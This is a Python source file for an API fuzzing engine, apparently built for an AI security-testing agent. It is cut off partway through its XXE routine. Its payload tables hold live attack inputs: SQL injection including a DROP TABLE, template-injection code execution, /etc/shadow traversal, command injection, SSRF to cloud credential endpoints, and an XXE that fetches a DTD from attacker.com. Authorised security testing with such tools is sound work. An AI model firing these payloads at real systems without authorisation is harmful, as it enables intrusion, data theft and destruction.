#/+
"""
api_fuzzer_v3.py
════════════════
Agent-optimized API fuzzing engine.

Design principles
─────────────────
• Output is agent-first: critical_findings[], param_summaries[], method_results[],
  content_type_results[] are pre-ranked and pre-filtered.  fuzz_results[] is
  intentionally omitted from the final dict to eliminate noise.
• Token-budget: every result carries only fields that change a triage decision.
• Token-bucket rate limiter shared across all threads.
• Per-finding deduplication by (url, param, payload_type, finding_type).
• Early-exit per param once a critical finding is confirmed.
• OpenAPI/Swagger ingestion drives endpoint + param discovery automatically.
• GraphQL introspection → field-level fuzzing pipeline.
• Entropy-based secret detection on every response.
• Session-pooled HTTP (one requests.Session per endpoint).
• ffuf path validation before subprocess launch.
"""

from __future__ import annotations

import concurrent.futures
import hashlib
import json
import logging
import math
import os
import re
import subprocess
import tempfile
import threading
import time
from typing import Any, Optional
from urllib.parse import parse_qs, urlencode, urlparse

import requests
import urllib3
from pydantic import BaseModel, Field, field_validator

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

log = logging.getLogger("api_fuzzer")
logging.basicConfig(level=logging.INFO,
                    format="%(asctime)s [%(levelname)s] %(message)s")


# ══════════════════════════════════════════════════════════════════════════════
# §1  RATE LIMITER
# ══════════════════════════════════════════════════════════════════════════════

class _TokenBucket:
    """Global token-bucket shared across all threads."""

    def __init__(self, rps: float = 30.0) -> None:
        self._cap   = max(1.0, float(rps))
        self._tok   = self._cap
        self._rps   = float(rps)
        self._ts    = time.monotonic()
        self._lock  = threading.Lock()
        self._used  = 0

    def acquire(self) -> None:
        while True:
            with self._lock:
                now = time.monotonic()
                self._tok = min(self._cap,
                                self._tok + (now - self._ts) * self._rps)
                self._ts  = now
                if self._tok >= 1.0:
                    self._tok -= 1.0
                    self._used += 1
                    return
            time.sleep(0.005)

    @property
    def used(self) -> int:
        with self._lock:
            return int(self._used)


_LIMITER = _TokenBucket(30.0)   # replaced per api_fuzzing() call


# ══════════════════════════════════════════════════════════════════════════════
# §2  SCHEMAS
# ══════════════════════════════════════════════════════════════════════════════

from server.agents.executer.recon.config import is_blocked_host
_DANGEROUS_CHARS = (";", "&&", "||", "|", "`", "$(", ">>")
_BLOCKED_FLAGS   = frozenset({"-o", "--output", "-O", "-od"})

_RE_DOMAIN  = re.compile(r"^https?://[a-zA-Z0-9]([a-zA-Z0-9\-]*\.)+[a-zA-Z]{2,}")
_RE_BARE    = re.compile(r"^[a-zA-Z0-9]([a-zA-Z0-9\-]*\.)+[a-zA-Z]{2,}$")
_RE_IP_HTTP = re.compile(r"^https?://(\d{1,3}\.){3}\d{1,3}")


def _host(url: str) -> str:
    try:
        return (urlparse(url if "://" in url else f"https://{url}").hostname or "").lower()
    except Exception:
        return ""


# ── Request schema ─────────────────────────────────────────────────────────

class FuzzRequest(BaseModel):
    tool:        str
    target:      str
    args:        list[str]       = []
    timeout:     int             = Field(600, ge=30, le=7200)
    endpoints:   list[str]      = []
    headers:     dict[str, str] = {}
    wordlist:    Optional[str]  = None
    methods:     list[str]      = ["GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS"]
    params:      dict[str, str] = {}
    body:        Optional[str]  = None
    rps:         float          = Field(30.0, ge=1.0, le=500.0)
    openapi_url: Optional[str]  = None
    quick:       bool           = False
    payload_cap: int            = Field(15, ge=1, le=30)
    max_endpoints: int          = Field(0, ge=0, le=100)
    confirm_findings: bool      = True
    confirmation_attempts: int  = Field(8, ge=1, le=30)

    @field_validator("tool")
    @classmethod
    def _tool(cls, v: str) -> str:
        if v not in {"ffuf", "manual"}:
            raise ValueError(f"tool must be ffuf | manual, got '{v}'")
        return v

    @field_validator("target")
    @classmethod
    def _target(cls, v: str) -> str:
        v = v.strip()
        h = _host(v)
        if is_blocked_host(h):
            raise ValueError(f"Target host is blocked: {v}")
        if not (_RE_DOMAIN.match(v) or _RE_BARE.match(v) or _RE_IP_HTTP.match(v)):
            raise ValueError(f"Invalid target format: {v}")
        return v

    @field_validator("args")
    @classmethod
    def _args(cls, v: list[str]) -> list[str]:
        for a in v:
            for c in _DANGEROUS_CHARS:
                if c in a:
                    raise ValueError(f"Dangerous char '{c}' in arg: {a!r}")
            if a.strip() in _BLOCKED_FLAGS:
                raise ValueError(f"Blocked flag: {a!r}")
        return v

    @field_validator("methods")
    @classmethod
    def _methods(cls, v: list[str]) -> list[str]:
        ok = {"GET","POST","PUT","PATCH","DELETE","OPTIONS","HEAD","TRACE","CONNECT"}
        return [m.upper() for m in v if m.upper() in ok]


# ── Result schemas ─────────────────────────────────────────────────────────

class Finding(BaseModel):
    """Single interesting HTTP interaction."""
    url:          str
    method:       str
    param:        Optional[str]   = None   # param_name or "header:X"
    payload:      str
    vuln_type:    str             = "none"
    severity:     str             = "info"
    status:       Optional[int]   = None
    resp_time:    Optional[float] = None
    resp_size:    Optional[int]   = None
    snippet:      Optional[str]   = None
    evidence:     list[str]       = []
    _hash:        str             = ""

    def stamp(self) -> "Finding":
        raw = f"{self.url}|{self.param}|{self.vuln_type}|{self.payload[:40]}"
        self._hash = hashlib.md5(raw.encode()).hexdigest()
        return self


class ParamSummary(BaseModel):
    param:     str
    endpoint:  str
    vulns:     list[str]    = []   # distinct vuln_types
    evidence:  list[str]   = []
    severity:  str         = "info"
    vulnerable: bool       = False


class MethodResult(BaseModel):
    endpoint:      str
    unexpected:    list[str] = []   # dangerous/write methods that responded
    evidence:      list[str] = []
    vulnerable:    bool      = False


class ContentTypeResult(BaseModel):
    endpoint:    str
    method:      str
    bypassed:    bool      = False
    accepted:    list[str] = []
    evidence:    list[str] = []


class FuzzResult(BaseModel):
    """Top-level return value — agent consumes this."""
    success:              bool
    vulnerable:           bool               = False
    confidence:           str                = "none"
    tool:                 str
    target:               str
    command:              str
    exec_time:            float               = 0.0
    techniques:           list[str]           = []
    discovered_endpoints: list[str]           = []

    # ── Agent-facing sections (ranked by severity) ──
    critical_findings:    list[Finding]       = []   # severity critical | high
    confirmed_findings:   list[Finding]       = []   # replay-validated high-signal findings
    param_summaries:      list[ParamSummary]  = []   # per-param triage
    method_results:       list[MethodResult]  = []
    content_type_results: list[ContentTypeResult] = []

    # ── Meta ──
    quick_mode:           bool                = False
    coverage_note:        str                 = ""
    total_sent:           int                 = 0  # total request attempts (manual exact, ffuf includes estimate)
    total_findings:       int                 = 0
    total_interesting:    int                 = 0
    llm_brief:            dict[str, Any]      = Field(default_factory=dict)
    error:                Optional[str]       = None


# ══════════════════════════════════════════════════════════════════════════════
# §3  PAYLOADS
# ══════════════════════════════════════════════════════════════════════════════

_P: dict[str, list[tuple[str, str]]] = {

    "sqli": [
        ("'",                                       "sqli_quote"),
        ("' OR '1'='1'--",                          "sqli_or_true"),
        ("' OR 1=1--",                              "sqli_or_int"),
        ("1 UNION SELECT NULL,NULL--",              "sqli_union"),
        ("1 AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--", "sqli_error_mysql"),
        ("1 AND SLEEP(3)--",                        "sqli_sleep"),
        ("1; WAITFOR DELAY '0:0:3'--",              "sqli_waitfor"),
        ("1 AND 1=1",                               "sqli_blind_true"),
        ("1 AND 1=2",                               "sqli_blind_false"),
        ('{"$gt":""}',                              "nosql_gt"),
        ('{"$ne":null}',                            "nosql_ne"),
        ('{"$where":"sleep(3000)"}',                "nosql_where"),
        ("[$ne]=1",                                 "nosql_ne_param"),
        ("admin'--",                                "sqli_admin"),
        ("'; DROP TABLE users;--",                  "sqli_drop"),
    ],

    "xss": [
        ("<script>alert(1)</script>",               "xss_script"),
        ("<img src=x onerror=alert(1)>",            "xss_img"),
        ("<svg onload=alert(1)>",                   "xss_svg"),
        ('"><script>alert(1)</script>',             "xss_break_attr"),
        ("javascript:alert(1)",                     "xss_js"),
        ("<details open ontoggle=alert(1)>",        "xss_details"),
        ("<input autofocus onfocus=alert(1)>",      "xss_autofocus"),
        ("%3Cscript%3Ealert(1)%3C/script%3E",       "xss_urlenc"),
        ("<iframe src=javascript:alert(1)>",        "xss_iframe"),
        ("</script><script>alert(1)</script>",      "xss_close"),
    ],

    "ssti": [
        ("{{7*7}}",                                 "ssti_jinja2"),
        ("${7*7}",                                  "ssti_el"),
        ("#{7*7}",                                  "ssti_erb"),
        ("<%= 7*7 %>",                              "ssti_erb2"),
        ("*{7*7}",                                  "ssti_spring"),
        ("{{7*'7'}}",                               "ssti_jinja2_str"),
        ("${{7*7}}",                                "ssti_twig"),
        ("{{config}}",                              "ssti_jinja2_cfg"),
        ("${T(java.lang.Runtime).getRuntime().exec('id')}", "ssti_spring_rce"),
        ("{{''.__class__.__mro__[1].__subclasses__()}}", "ssti_subclasses"),
    ],

    "lfi": [
        ("../../../etc/passwd",                     "lfi_passwd"),
        ("....//....//etc/passwd",                  "lfi_double_dot"),
        ("..%2F..%2F..%2Fetc%2Fpasswd",            "lfi_urlenc"),
        ("%2e%2e%2f%2e%2e%2fetc%2fpasswd",         "lfi_dblenc"),
        ("..%252F..%252Fetc%252Fpasswd",           "lfi_dblenc2"),
        ("..\\..\\windows\\win.ini",               "lfi_win"),
        ("/proc/self/environ",                      "lfi_environ"),
        ("file:///etc/passwd",                      "lfi_file_scheme"),
        ("php://filter/convert.base64-encode/resource=index.php", "lfi_phpfilter"),
        ("/etc/shadow",                             "lfi_shadow"),
    ],

    "cmdi": [
        ("; id",                                    "cmdi_semi"),
        ("| id",                                    "cmdi_pipe"),
        ("`id`",                                    "cmdi_backtick"),
        ("$(id)",                                   "cmdi_dollar"),
        ("; sleep 3",                               "cmdi_sleep"),
        ("; cat /etc/passwd",                       "cmdi_passwd"),
        ("%0aid",                                   "cmdi_newline"),
        ("${IFS}id",                                "cmdi_ifs"),
        ("& ipconfig",                              "cmdi_win"),
        ("|| id",                                   "cmdi_or"),
    ],

    "overflow": [
        ("A" * 1000,                                "of_1k"),
        ("A" * 10000,                               "of_10k"),
        ("A" * 65535,                               "of_64k"),
        ("%n" * 100,                                "of_fmtn"),
        ("%s" * 100,                                "of_fmts"),
        ("-1",                                      "of_neg"),
        ("2147483648",                              "of_intmax"),
        ("-2147483649",                             "of_intmin"),
        ("9999999999999999999",                     "of_bignum"),
        ("NaN",                                     "of_nan"),
        ("null",                                    "of_null"),
        ("[]",                                      "of_array"),
        ("{}",                                      "of_obj"),
    ],

    "ssrf": [
        ("http://169.254.169.254/latest/meta-data/",          "ssrf_aws"),
        ("http://169.254.169.254/latest/meta-data/iam/security-credentials/", "ssrf_aws_iam"),
        ("http://metadata.google.internal/computeMetadata/v1/","ssrf_gcp"),
        ("http://169.254.169.254/metadata/instance?api-version=2021-02-01", "ssrf_azure"),
        ("http://localhost:80",                               "ssrf_lo80"),
        ("http://127.0.0.1",                                  "ssrf_lo"),
        ("http://0.0.0.0:80",                                 "ssrf_zero"),
        ("http://2130706433",                                 "ssrf_dec"),
        ("dict://localhost:11211/",                           "ssrf_memcache"),
        ("gopher://localhost:6379/_PING",                     "ssrf_redis"),
        ("file:///etc/passwd",                               "ssrf_file"),
    ],

    "xxe": [
        ('<?xml version="1.0"?>\n<!DOCTYPE foo [<!ENTITY x SYSTEM "file:///etc/passwd">]>\n<foo>&x;</foo>',
         "xxe_passwd"),
        ('<?xml version="1.0"?>\n<!DOCTYPE foo [<!ENTITY x SYSTEM "http://169.254.169.254/latest/meta-data/">]>\n<foo>&x;</foo>',
         "xxe_ssrf"),
        ('<?xml version="1.0"?>\n<!DOCTYPE foo [<!ENTITY x SYSTEM "file:///etc/shadow">]>\n<foo>&x;</foo>',
         "xxe_shadow"),
        ('<?xml version="1.0"?>\n<!DOCTYPE foo [<!ENTITY x SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]>\n<foo>&x;</foo>',
         "xxe_php"),
        ('<?xml version="1.0"?>\n<!DOCTYPE foo [<!ENTITY % x SYSTEM "http://attacker.com/evil.dtd"> %x;]>\n<foo/>',
         "xxe_oob"),
    ],

    "redirect": [
        ("https://evil.com",                        "redir_ext"),
        ("//evil.com",                              "redir_proto"),
        ("/\\evil.com",                             "redir_backslash"),
        ("https://evil.com%2F@target",             "redir_at"),
        ("javascript:alert(1)",                     "redir_js"),
        ("%2Fevil.com",                             "redir_enc"),
        ("%252Fevil.com",                           "redir_dblenc"),
    ],
}

_ALL_METHODS = [
    "GET","POST","PUT","PATCH","DELETE","OPTIONS","HEAD","TRACE",
    "CONNECT","PROPFIND","PROPPATCH","MKCOL","COPY","MOVE",
    "LOCK","UNLOCK","SEARCH","PURGE","DEBUG",
]

_CONTENT_TYPES = [
    "application/json",
    "application/x-www-form-urlencoded",
    "multipart/form-data",
    "text/xml",
    "application/xml",
    "application/soap+xml",
    "text/plain",
    "text/html",
    "application/graphql",
    "application/ld+json",
    "application/vnd.api+json",
    "application/json; charset=utf-16",
    "*/*",
    "",
]


def _payloads(cats: Optional[list[str]] = None,
              cap: int = 15) -> list[tuple[str, str, str]]:
    """Return [(payload, label, category)] list."""
    out: list[tuple[str, str, str]] = []
    for cat in (cats or list(_P)):
        for payload, label in _P.get(cat, [])[:cap]:
            out.append((payload, label, cat))
    return out


# ══════════════════════════════════════════════════════════════════════════════
# §4  CONFIRMATION LOGIC
# ══════════════════════════════════════════════════════════════════════════════

_SIGS: dict[str, tuple[str, str, list[str]]] = {
    # key → (vuln_type, severity, [regex patterns])
    "sql":  ("sqli",              "critical", [
        r"sql syntax", r"mysql_fetch", r"ora-0\d", r"postgresql error",
        r"sqlite3", r"sqlexception", r"unclosed quotation",
        r"you have an error in your sql", r"invalid input syntax",
        r"division by zero", r"column .+ does not exist",
    ]),
    "code": ("code_disclosure",   "high", [
        r"traceback \(most recent call last\)", r"nullpointerexception",
        r"fatal error", r"parse error", r"stack trace",
        r"at java\.lang\.", r"system\.exception", r"unhandled exception",
    ]),
    "ssti": ("ssti",              "critical", [r"\b49\b", r"7777777"]),
    "lfi":  ("path_traversal",   "critical", [
        r"root:x:0:0", r"daemon:x:", r"nobody:x:", r"\[fonts\]", r"\[extensions\]",
    ]),
    "cmdi": ("command_injection", "critical", [
        r"uid=\d+\(", r"gid=\d+\(", r"total \d+", r"drwxr",
    ]),
    "ssrf": ("ssrf",             "critical", [
        r"ami-id", r"instance-id", r"computeMetadata", r"access_token",
    ]),
}

_SEV = {"critical": 4, "high": 3, "medium": 2, "low": 1, "info": 0}

# Secret-leak entropy patterns
_SECRET_RE = [
    re.compile(r"eyJ[A-Za-z0-9._-]{50,}"),                      # JWT
    re.compile(r"AKIA[0-9A-Z]{16}"),                            # AWS key
    re.compile(r"[0-9a-f]{40,}"),                               # hex token
    re.compile(r"[A-Za-z0-9+/]{60,}={0,2}"),                   # b64 blob
    re.compile(r'"(?:password|secret|token|api_key|apikey)"\s*:\s*"[^"]{6,}"',
               re.I),
]


def _entropy(s: str) -> float:
    if not s:
        return 0.0
    f = {}
    for c in s:
        f[c] = f.get(c, 0) + 1
    n = len(s)
    return -sum((v / n) * math.log2(v / n) for v in f.values())


def _secrets(body: str) -> list[str]:
    out: list[str] = []
    for pat in _SECRET_RE:
        for m in pat.findall(body):
            cand = m if isinstance(m, str) else m
            if _entropy(cand) > 4.5:
                out.append(f"Possible secret: {cand[:60]}…")
    return out[:3]


def _confirm(
    url:            str,
    method:         str,
    param:          Optional[str],
    payload:        str,
    label:          str,
    cat:            str,
    status:         Optional[int],
    body:           Optional[str],
    hdrs:           dict[str, str],
    elapsed:        float,
    bl_status:      Optional[int],
    bl_len:         Optional[int],
) -> Optional[Finding]:
    """
    Apply all confirmation rules to one HTTP response.
    Returns a Finding if interesting, else None.
    """
    body     = body or ""
    body_lc  = body.lower()
    evidence: list[str] = []
    vuln_type = "none"
    severity  = "info"

    # ── 1. Error signature scan ──────────────────────────────────────────
    for sig_key, (vt, sv, patterns) in _SIGS.items():
        # SSTI patterns only confirm when the payload is actually SSTI
        if sig_key == "ssti" and cat != "ssti":
            continue
        for pat in patterns:
            if re.search(pat, body_lc, re.I):
                vuln_type = vt
                severity  = sv
                evidence.append(f"[{sig_key}] matched '{pat}'")
                break
        if vuln_type != "none":
            break

    # ── 2. XSS reflection ────────────────────────────────────────────────
    if cat == "xss" and payload[:20] in body:
        vuln_type = "xss_reflection"
        severity  = "high"
        evidence.append("XSS payload reflected verbatim")

    # ── 3. Time-based injection ──────────────────────────────────────────
    if elapsed > 2.8 and any(k in label for k in ("sleep", "waitfor", "delay")):
        if _SEV.get(severity, 0) < _SEV["high"]:
            vuln_type = "time_based_injection"
            severity  = "high"
        evidence.append(f"Elapsed {elapsed:.2f}s on time payload '{label}'")

    # ── 4. Auth bypass ───────────────────────────────────────────────────
    if bl_status in (401, 403) and status in (200, 201, 204):
        vuln_type = "auth_bypass"
        severity  = "critical"
        evidence.append(f"Status {bl_status} → {status} with payload")

    # ── 5. SSRF redirect ─────────────────────────────────────────────────
    if cat == "ssrf" and status in (301, 302, 307, 308):
        loc = hdrs.get("location", "")
        if any(k in loc for k in ("169.254", "metadata", "localhost", "127.")):
            vuln_type = "ssrf"
            severity  = "critical"
            evidence.append(f"SSRF redirect → {loc}")

    # ── 6. Open redirect ─────────────────────────────────────────────────
    if cat == "redirect" and status in (301, 302, 307, 308):
        loc = hdrs.get("location", "")
        if "evil.com" in loc or "attacker" in loc:
            vuln_type = "open_redirect"
            severity  = "medium"
            evidence.append(f"Redirect → {loc}")

    # ── 7. Size anomaly ──────────────────────────────────────────────────
    cur_len = len(body)
    if bl_len and cur_len and bl_len > 0:
        diff = abs(cur_len - bl_len)
        if diff > 500 and diff > bl_len * 0.5:
            evidence.append(f"Size Δ {diff} (baseline {bl_len} → {cur_len})")

    # ── 8. Secret / entropy leak ─────────────────────────────────────────
    secrets = _secrets(body)
    if secrets:
        if _SEV.get(severity, 0) < _SEV["high"]:
            vuln_type = "secret_disclosure"
            severity  = "high"
        evidence.extend(secrets)

    # ── 9. Generic 5xx ───────────────────────────────────────────────────
    if status and status >= 500:
        if vuln_type == "none":
            vuln_type = "server_error"
            severity  = "low"
        evidence.append(f"HTTP {status}")

    if not evidence:
        return None

    return Finding(
        url=url, method=method, param=param,
        payload=payload[:200], vuln_type=vuln_type,
        severity=severity, status=status,
        resp_time=round(elapsed, 3),
        resp_size=len(body),
        snippet=body[:300] if body else None,
        evidence=evidence,
    ).stamp()


# ══════════════════════════════════════════════════════════════════════════════
# §5  DEDUPLICATOR
# ══════════════════════════════════════════════════════════════════════════════

class _Dedup:
    def __init__(self) -> None:
        self._seen: set[str] = set()
        self._lock = threading.Lock()

    def is_new(self, f: Finding) -> bool:
        with self._lock:
            if f._hash in self._seen:
                return False
            self._seen.add(f._hash)
            return True

    def reset(self) -> None:
        with self._lock:
            self._seen.clear()


_DEDUP = _Dedup()


# ══════════════════════════════════════════════════════════════════════════════
# §6  HTTP SESSION + BASELINE
# ══════════════════════════════════════════════════════════════════════════════

def _session(headers: dict[str, str]) -> requests.Session:
    s = requests.Session()
    s.verify  = False
    s.headers.update({"User-Agent": "APIFuzzer/3.0", **headers})
    return s


def _baseline(
    sess: requests.Session, method: str, url: str,
    params: Optional[dict] = None,
    json_body: Optional[dict] = None,
    timeout: int = 8,
) -> tuple[Optional[int], Optional[int]]:
    """Return (status, content_length) for baseline request."""
    try:
        _LIMITER.acquire()
        r = sess.request(method, url, params=params,
                         json=json_body, timeout=timeout)
        return r.status_code, len(r.content)
    except Exception:
        return None, None


# ══════════════════════════════════════════════════════════════════════════════
# §7  OPENAPI INGESTION
# ══════════════════════════════════════════════════════════════════════════════

def _schema_example(t: str) -> str:
    return {"integer": "1", "number": "1.0", "boolean": "true",
            "array": "[]", "object": "{}"}.get(t, "test")


def fetch_openapi(url: str, timeout: int = 10) -> dict:
    try:
        r = requests.get(url, timeout=timeout, verify=False)
        r.raise_for_status()
        return r.json()
    except Exception as e:
        log.warning("OpenAPI fetch failed: %s", e)
        return {}


def parse_openapi(spec: dict, base_url: str) -> tuple[list[str], dict[str, dict]]:
    """Return (endpoint_urls, {url: {param: example}})."""
    if not spec:
        return [], {}

    server = base_url
    if "servers" in spec and spec["servers"]:
        server = spec["servers"][0].get("url", base_url)
    elif "basePath" in spec:
        server = base_url.rstrip("/") + spec.get("basePath", "")

    eps: list[str]              = []
    pmap: dict[str, dict]       = {}

    for path, methods_obj in spec.get("paths", {}).items():
        full = server.rstrip("/") + path
        eps.append(full)
        pmap[full] = {}
        for _method, op in methods_obj.items():
            if not isinstance(op, dict):
                continue
            for param in op.get("parameters", []):
                name = param.get("name", "")
                loc  = param.get("in", "")
                if name and loc in ("query", "path"):
                    schema  = param.get("schema") or {}
                    example = (param.get("example")
                               or schema.get("example")
                               or schema.get("default")
                               or _schema_example(schema.get("type", "string")))
                    pmap[full][name] = str(example)

    log.info("OpenAPI: %d endpoints discovered", len(eps))
    return eps, pmap


# ══════════════════════════════════════════════════════════════════════════════
# §8  FUZZ ENGINES
# ══════════════════════════════════════════════════════════════════════════════

_EARLY_EXIT = {"critical"}


# ─── URL param fuzzing ──────────────────────────────────────────────────────

def fuzz_url_params(
    url:      str,
    method:   str,
    ep_params: dict[str, str],
    sess:     requests.Session,
    payloads: list[tuple[str, str, str]],
    timeout:  int = 8,
) -> list[Finding]:
    findings: list[Finding] = []

    to_fuzz = list(ep_params.keys()) if ep_params else [
        "id", "user", "file", "url", "path",
        "q", "search", "page", "redirect", "data",
    ]
    bl_status, bl_len = _baseline(sess, method, url, ep_params or None,
                                   None, timeout)

    for param in to_fuzz:
        stop = False
        for payload, label, cat in payloads:
            if stop:
                break
            _LIMITER.acquire()
            fuzz_p = {**ep_params, param: payload}
            t0 = time.monotonic()
            try:
                r = sess.request(method, url, params=fuzz_p,
                                 timeout=timeout, allow_redirects=False)
                f = _confirm(
                    url=f"{url}?{param}=…", method=method, param=param,
                    payload=payload, label=label, cat=cat,
                    status=r.status_code,
                    body=r.text[:3000],
                    hdrs={k.lower(): v for k, v in r.headers.items()},
                    elapsed=time.monotonic() - t0,
                    bl_status=bl_status, bl_len=bl_len,
                )
                if f and _DEDUP.is_new(f):
                    findings.append(f)
                    if f.severity in _EARLY_EXIT:
                        stop = True

            except requests.Timeout:
                if any(k in label for k in ("sleep", "waitfor", "delay")):
                    f = Finding(
                        url=url, method=method, param=param,
                        payload=payload[:100], vuln_type="time_based_injection",
                        severity="high", resp_time=float(timeout),
                        evidence=[f"Timeout on '{label}'"],
                    ).stamp()
                    if _DEDUP.is_new(f):
                        findings.append(f)
            except Exception as e:
                log.debug("url_params: %s", e)

    return findings


# ─── Body param fuzzing ─────────────────────────────────────────────────────

def _body_request(
    sess: requests.Session, method: str, url: str,
    fields: dict, body_type: str, ct_header: str,
    timeout: int,
) -> requests.Response:
    hdrs = {"Content-Type": ct_header}
    if body_type == "json":
        return sess.request(method, url, json=fields, headers=hdrs,
                            timeout=timeout, allow_redirects=False)
    return sess.request(method, url, data=fields, headers=hdrs,
                        timeout=timeout, allow_redirects=False)


def fuzz_body_params(
    url:      str,
    method:   str,
    base_body: Optional[str],
    ct:       str,
    sess:     requests.Session,
    payloads: list[tuple[str, str, str]],
    timeout:  int = 8,
) -> list[Finding]:
    findings: list[Finding] = []

    body_fields: dict[str, Any] = {}
    body_type = "json"

    if base_body:
        if "json" in ct:
            try:
                obj = json.loads(base_body)
                if isinstance(obj, dict):
                    body_fields = obj
            except Exception:
                body_fields = {"data": base_body}
        elif "form" in ct:
            body_fields = {k: v[0] for k, v in parse_qs(base_body).items()}
            body_type   = "form"
        else:
            body_fields = {"data": base_body}
    else:
        body_fields = {
            "id": "1", "user": "admin", "username": "admin",
            "email": "test@test.com", "url": "http://example.com",
            "file": "test.txt", "path": "/", "data": "test",
            "query": "test", "search": "test",
        }

    bl_status, bl_len = None, None
    try:
        _LIMITER.acquire()
        bl        = _body_request(sess, method, url, body_fields, body_type, ct, timeout)
        bl_status = bl.status_code
        bl_len    = len(bl.content)
    except Exception:
        pass

    for field in list(body_fields.keys()):
        stop = False
        for payload, label, cat in payloads:
            if stop:
                break
            _LIMITER.acquire()
            fuzz_f = {**body_fields, field: payload}
            t0 = time.monotonic()
            try:
                r = _body_request(sess, method, url, fuzz_f, body_type, ct, timeout)
                f = _confirm(
                    url=url, method=method, param=field,
                    payload=payload, label=label, cat=cat,
                    status=r.status_code,
                    body=r.text[:3000],
                    hdrs={k.lower(): v for k, v in r.headers.items()},
                    elapsed=time.monotonic() - t0,
                    bl_status=bl_status, bl_len=bl_len,
                )
                if f and _DEDUP.is_new(f):
                    findings.append(f)
                    if f.severity in _EARLY_EXIT:
                        stop = True

            except requests.Timeout:
                if any(k in label for k in ("sleep", "waitfor", "delay")):
                    f = Finding(
                        url=url, method=method, param=field,
                        payload=payload[:100], vuln_type="time_based_injection",
                        severity="high", resp_time=float(timeout),
                        evidence=[f"Body '{field}': timeout on '{label}'"],
                    ).stamp()
                    if _DEDUP.is_new(f):
                        findings.append(f)
            except Exception as e:
                log.debug("body_params: %s", e)

    return findings


# ─── HTTP method fuzzing ────────────────────────────────────────────────────

_DANGEROUS_METHODS = {"TRACE", "DEBUG", "CONNECT", "PROPFIND",
                      "PROPPATCH", "COPY", "MOVE"}
_WRITE_METHODS     = {"PUT", "DELETE", "PATCH"}


def fuzz_methods(
    url:     str,
    sess:    requests.Session,
    timeout: int = 8,
    methods: Optional[list[str]] = None,
    quick:   bool = False,
) -> MethodResult:
    result = MethodResult(endpoint=url)

    # OPTIONS probe first
    try:
        _LIMITER.acquire()
        o = sess.options(url, timeout=timeout)
        allow = o.headers.get("Allow") or o.headers.get("Access-Control-Allow-Methods") or ""
        if allow:
            result.evidence.append(f"OPTIONS Allow: {allow}")
    except Exception:
        pass

    methods_to_test = methods or _ALL_METHODS
    for method in methods_to_test:
        _LIMITER.acquire()
        try:
            data = "fuzz" if method in ("POST", "PUT", "PATCH") else None
            r    = sess.request(method, url, data=data,
                                timeout=timeout, allow_redirects=False)
            if r.status_code not in (405, 501, 404, 403, 400):
                if method in _DANGEROUS_METHODS:
                    result.vulnerable = True
                    result.unexpected.append(method)
                    result.evidence.append(f"DANGEROUS {method} → {r.status_code}")
                elif method in _WRITE_METHODS and r.status_code in (200, 201, 204):
                    result.vulnerable = True
                    result.unexpected.append(method)
                    result.evidence.append(f"WRITE {method} → {r.status_code}")
        except Exception:
            pass

    if not quick:
        # Method override checks are useful but can be expensive on slow targets.
        for hdr, m in {
            "X-HTTP-Method-Override": "DELETE",
            "X-Method-Override":      "PUT",
            "_method":                "DELETE",
        }.items():
            try:
                _LIMITER.acquire()
                r1 = sess.get(url, headers={hdr: m}, timeout=timeout)
                _LIMITER.acquire()
                r2 = sess.get(url, timeout=timeout)
                if r1.status_code != r2.status_code:
                    result.vulnerable = True
                    result.evidence.append(
                        f"Override '{hdr}: {m}' → {r2.status_code} became {r1.status_code}"
                    )
            except Exception:
                pass

    return result


# ─── Content-type fuzzing ───────────────────────────────────────────────────

def fuzz_content_types(
    url:      str,
    method:   str,
    body:     str,
    sess:     requests.Session,
    timeout:  int = 8,
) -> ContentTypeResult:
    result = ContentTypeResult(endpoint=url, method=method)

    bl_status = None
    try:
        _LIMITER.acquire()
        bl        = sess.request(method, url,
                                 headers={"Content-Type": "application/json"},
                                 data=body or '{"test":"fuzz"}',
                                 timeout=timeout)
        bl_status = bl.status_code
    except Exception:
        pass

    for ct in _CONTENT_TYPES:
        body_for_ct = (
            '<?xml version="1.0"?><root><test>fuzz</test></root>'
            if "xml" in ct else
            '{"query":"{__typename}"}' if "graphql" in ct else
            "test=fuzz&id=1" if "form" in ct else
            body or '{"test":"fuzz"}'
        )
        _LIMITER.acquire()
        try:
            r = sess.request(method, url,
                             headers={"Content-Type": ct},
                             data=body_for_ct,
                             timeout=timeout, allow_redirects=False)
            if r.status_code != 415:
                result.accepted.append(ct)

                if "xml" in ct and r.status_code in (200, 500):
                    if any(kw in r.text.lower() for kw in
                           ["root:", "etc/passwd"]):
                        result.bypassed = True
                        result.evidence.append(f"XXE potential via {ct}")

                if bl_status in (401, 403) and r.status_code in (200, 201, 204):
                    result.bypassed = True
                    result.evidence.append(
                        f"Auth bypass via Content-Type: {ct} → {r.status_code}"
                    )
        except Exception:
            pass

    return result


# ─── Header injection ───────────────────────────────────────────────────────

_INJECTABLE_HEADERS = [
    "User-Agent", "Referer", "X-Forwarded-For",
    "X-Real-IP", "Accept-Language", "Accept",
]
_HDR_CATS = {"sqli", "xss", "ssti", "ssrf", "cmdi"}


def fuzz_headers(
    url:      str,
    method:   str,
    sess:     requests.Session,
    payloads: list[tuple[str, str, str]],
    timeout:  int = 8,
) -> list[Finding]:
    findings: list[Finding] = []
    bl_status, bl_len = _baseline(sess, method, url, None, None, timeout)

    hdr_payloads = [(p, l, c) for p, l, c in payloads if c in _HDR_CATS][:40]

    for hdr in _INJECTABLE_HEADERS:
        for payload, label, cat in hdr_payloads[:12]:
            _LIMITER.acquire()
            t0 = time.monotonic()
            try:
                r = sess.request(method, url, headers={hdr: payload},
                                 timeout=timeout, allow_redirects=False)
                f = _confirm(
                    url=url, method=method, param=f"header:{hdr}",
                    payload=payload, label=label, cat=cat,
                    status=r.status_code,
                    body=r.text[:3000],
                    hdrs={k.lower(): v for k, v in r.headers.items()},
                    elapsed=time.monotonic() - t0,
                    bl_status=bl_status, bl_len=bl_len,
                )
                if f and _DEDUP.is_new(f):
                    f.evidence.insert(0, f"Via header '{hdr}'")
                    findings.append(f)
            except Exception:
                pass

    return findings


# ─── XXE fuzzing ────────────────────────────────────────────────────────────

def fuzz_xxe(
    url:     str,
    method:  str,
    sess:    requests.Session,
    timeout: int = 10,
) -> list[Finding]:
    findings: list[Finding] = []
    xml_hdrs = {"Content-Type": "application/xml",
                "Accept":       "application/xml, text/xml, */*"}

    indicators = ["root:x:0:0", "daemon:x:", "ami-id", "computeMetadata", "[fonts]"]

